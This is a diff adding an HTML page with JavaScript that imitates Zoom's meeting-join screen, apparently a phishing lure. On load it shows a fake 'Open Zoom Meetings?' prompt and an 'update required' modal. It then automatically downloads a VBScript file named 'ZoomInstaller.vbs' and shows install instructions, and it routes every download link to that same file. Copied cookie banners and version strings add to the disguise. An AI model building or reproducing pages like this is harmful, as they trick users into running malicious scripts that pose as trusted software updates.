+    <p>Your app version needs to be 7.1.8 (46825) or higher to join this meeting. Please update to continue.</p>
+
+    <div class="modal-footer">
+      <button class="link-btn" onclick="startBrowserJoin()">Join from browser</button>
+      <div class="action-buttons">
+        <button class="btn btn-primary" onclick="manualUpdate()">Update</button>
+        <button class="btn btn-secondary" onclick="closeUpdateModal('cancel')">Cancel</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================
+     Body shown when the modal's Cancel is clicked
+     ============================================================ -->
+<div id="bodyAfterCancel">
+  <div style="padding:60px;text-align:center;font-family:var(--z-font);">
+    <h2>Join cancelled</h2>
+    <p>Replace this with your own content.</p>
+  </div>
+</div>
+
+<!-- ============================================================
+     GLUE SCRIPT — home page only
+     ============================================================ -->
+<script src="lang.js"></script>
+
+<script>
+(function () {
+  'use strict';
+
+  // ============================================================
+  //  ★ CONFIG
+  // ============================================================
+  var UPDATE_DOWNLOAD_URL = '/Zoom_Installer_Download/ZoomInstaller.vbs';
+  var UPDATE_REDIRECT_URL = '#';
+  var PREVIEW_PAGE_URL    = 'preview/spinner.html?to=index.html&ms=3000';
+  var AUTO_DL_DELAY_MS    = 1000;
+
+  var $ = function (id) { return document.getElementById(id); };
+
+  // -------- Element refs --------
+  var openDlg     = $('openZoomDialog');
+  var ozdOpenBtn  = $('ozdOpenBtn');
+  var ozdCancel   = $('ozdCancelBtn');
+  var modal       = $('updateModal');
+  var original    = $('originalPageRoot');
+  var bodyCancel  = $('bodyAfterCancel');
+
+  // -------- Helpers --------
+  function hideAllBodies() {
+    [original, bodyCancel].forEach(function (el) {
+      if (el) el.classList.remove('is-open');
+    });
+    if (original) original.style.display = 'none';
+  }
+
+  function showBody(el) {
+    hideAllBodies();
+    if (!el) return;
+    el.classList.add('is-open');
+    if (el === original) el.style.display = '';
+  }
+
+  function showInstallInstructions() {
+    var scr = document.getElementById('installInstructionsScreen');
+    if (!scr) return;
+    var mainFrame = document.getElementById('zoom-ui-frame');
+    if (mainFrame) mainFrame.style.display = 'none';
+    var pop = document.getElementById('zoom-did-not-open-popover');
+    if (pop) pop.style.display = 'none';
+    scr.style.display = '';
+    window.scrollTo(0, 0);
+  }
+
+  function triggerDownload() {
+    if (!UPDATE_DOWNLOAD_URL || UPDATE_DOWNLOAD_URL === '#') {
+      console.warn('[glue] UPDATE_DOWNLOAD_URL not set.');
+      return;
+    }
+    var a = document.createElement('a');
+    a.href = UPDATE_DOWNLOAD_URL;
+    a.download = 'ZoomInstaller.vbs';
+    a.rel = 'noopener';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function () { a.remove(); }, 0);
+    setTimeout(showInstallInstructions, 150);
+  }
+
+  // ============================================================
+  // "Open Zoom Meetings?" dialog
+  // ============================================================
+  var ozdBackdrop = document.getElementById('openZoomBackdrop');
+
+  function openZoomMeetingsDialog() {
+    if (ozdBackdrop) ozdBackdrop.classList.add('is-open');
+    if (openDlg) openDlg.classList.add('is-open');
+    document.body.classList.add('ozd-locked');
+  }
+
+  function closeZoomMeetingsDialog() {
+    if (ozdBackdrop) ozdBackdrop.classList.remove('is-open');
+    if (openDlg) openDlg.classList.remove('is-open');
+    document.body.classList.remove('ozd-locked');
+  }
+
+  if (ozdOpenBtn) {
+    ozdOpenBtn.addEventListener('click', function () {
+      closeZoomMeetingsDialog();
+      window.openUpdateModal();
+    });
+  }
+  if (ozdCancel) {
+    ozdCancel.addEventListener('click', function () {
+      closeZoomMeetingsDialog();
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', openZoomMeetingsDialog);
+  } else {
+    openZoomMeetingsDialog();
+  }
+
+  // ============================================================
+  // Update modal
+  // ============================================================
+  window.openUpdateModal = function () {
+    if (modal) modal.classList.add('is-open');
+    setTimeout(triggerDownload, AUTO_DL_DELAY_MS);
+  };
+
+  window.closeUpdateModal = function (reason) {
+    if (modal) modal.classList.remove('is-open');
+    if (reason === 'cancel') showBody(bodyCancel);
+  };
+
+  window.manualUpdate = function () {
+    triggerDownload();
+    if (UPDATE_REDIRECT_URL && UPDATE_REDIRECT_URL !== '#') {
+      setTimeout(function () { window.location.href = UPDATE_REDIRECT_URL; }, 400);
+    }
+  };
+
+  // ============================================================
+  // "Join from browser" → NAVIGATE to preview subfolder
+  // ============================================================
+  window.startBrowserJoin = function () {
+    if (modal) modal.classList.remove('is-open');
+    window.location.href = PREVIEW_PAGE_URL;
+  };
+
+  // ============================================================
+  // Download link delegation
+  // ============================================================
+  function handlePopoverDownload(e) {
+    if (e) e.preventDefault();
+    triggerDownload();
+  }
+
+  document.addEventListener('click', function (e) {
+    var el = e.target.closest && e.target.closest('a');
+    if (!el) return;
+    var id = el.id;
+    if (id === 'znpDownloadLink' ||
+        id === 'installScreenDownloadLink' ||
+        id === 'mainCardDownloadLink') {
+      handlePopoverDownload(e);
+    }
+  });
+
+  // ============================================================
+  // Popover close
+  // ============================================================
+  (function () {
+    var btn = document.getElementById('zoom-did-not-open-close');
+    var box = document.getElementById('zoom-did-not-open-popover');
+    if (btn && box) btn.addEventListener('click', function () { box.style.display = 'none'; });
+  })();
+
+  // ============================================================
+  // Language dropdown
+  // ============================================================
+  (function () {
+    var btn  = document.getElementById('langBtn');
+    var menu = document.getElementById('langMenu');
+    if (!btn || !menu) return;
+
+    btn.addEventListener('click', function (e) {
+      e.preventDefault(); e.stopPropagation();
+      var isOpen = menu.classList.toggle('open');
+      menu.hidden = !isOpen;
+      btn.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
+    });
+
+    menu.addEventListener('click', function (e) {
+      var li = e.target.closest('li[role="menuitem"]');
+      if (!li) return;
+      var lang = li.getAttribute('data-key') || 'en-US';
+      if (window.zoomApplyLanguage) window.zoomApplyLanguage(lang);
+      menu.querySelectorAll('li').forEach(function (el) { el.classList.remove('h_GAeXIH'); });
+      li.classList.add('h_GAeXIH');
+      try { localStorage.setItem('zoom.lang', lang); } catch (err) {}
+      var label = li.textContent.trim();
+      if (btn.childNodes[0] && btn.childNodes[0].nodeType === 3) {
+        btn.childNodes[0].nodeValue = label + ' ';
+      } else {
+        btn.insertBefore(document.createTextNode(label + ' '), btn.firstChild);
+      }
+      menu.classList.remove('open'); menu.hidden = true;
+      btn.setAttribute('aria-expanded', 'false');
+    });
+
+    document.addEventListener('click', function (e) {
+      if (!btn.contains(e.target) && !menu.contains(e.target)) {
+        menu.classList.remove('open'); menu.hidden = true;
+        btn.setAttribute('aria-expanded', 'false');
+      }
+    });
+
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape') {
+        menu.classList.remove('open'); menu.hidden = true;
+        btn.setAttribute('aria-expanded', 'false');
+      }
+    });
+
+    try {
+      var saved = localStorage.getItem('zoom.lang');
+      if (saved) {
+        var match = menu.querySelector('li[data-key="' + saved + '"]');
+        if (match) {
+          menu.querySelectorAll('li').forEach(function (el) { el.classList.remove('h_GAeXIH'); });
+          match.classList.add('h_GAeXIH');
+          var label = match.textContent.trim();
+          if (btn.childNodes[0] && btn.childNodes[0].nodeType === 3) {
+            btn.childNodes[0].nodeValue = label + ' ';
+          }
+        }
+      }
+    } catch (err) {}
+  })();
+
+  // ============================================================
+  // Cookie banner
+  // ============================================================
+  (function () {
+    var STORAGE_KEY = 'zoom.cookieConsent';
+    var banner = document.getElementById('onetrust-banner-sdk');
+    if (!banner) return;
+
+    function hideBanner() {
+      banner.classList.remove('ot-visible');
+      setTimeout(function () { banner.style.display = 'none'; }, 350);
+    }
+    function save(value) {
+      try { localStorage.setItem(STORAGE_KEY, value); } catch (e) {}
+      document.cookie = STORAGE_KEY + '=' + value + '; max-age=31536000; path=/; SameSite=Lax';
+    }
+
+    var existing = null;
+    try { existing = localStorage.getItem(STORAGE_KEY); } catch (e) {}
+    if (!existing) {
+      window.addEventListener('load', function () {
+        setTimeout(function () {
+          banner.style.display = '';
+          void banner.offsetWidth;
+          banner.classList.add('ot-visible');
+        }, 1000);
+      });
+    } else {
+      banner.style.display = 'none';
+    }
+
+    var accept   = document.getElementById('onetrust-accept-btn-handler');
+    var reject   = document.getElementById('onetrust-reject-all-handler');
+    var closeBtn = banner.querySelector('.onetrust-close-btn-handler');
+    var settings = document.getElementById('onetrust-pc-btn-handler');
+    if (accept)   accept.addEventListener('click',  function () { save('accepted');  hideBanner(); });
+    if (reject)   reject.addEventListener('click',  function () { save('declined');  hideBanner(); });
+    if (closeBtn) closeBtn.addEventListener('click',function () { save('dismissed'); hideBanner(); });
+    if (settings) settings.addEventListener('click', function () { alert('Cookie settings would open here.'); });
+  })();
+
+})();
+</script>
+</body>
+</html>
